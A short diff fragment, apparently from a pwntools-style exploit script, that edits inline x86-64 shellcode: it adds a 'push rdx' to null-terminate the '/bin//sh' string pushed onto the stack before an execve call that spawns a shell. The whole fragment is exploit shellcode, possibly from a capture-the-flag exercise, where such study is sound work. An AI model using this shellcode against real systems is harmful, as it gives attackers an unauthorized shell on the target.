@@ -279,6 +279,7 @@ int main() {
     shellcode = asm('''
        xor rsi, rsi
        xor rdx, rdx
+       push rdx
        mov rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
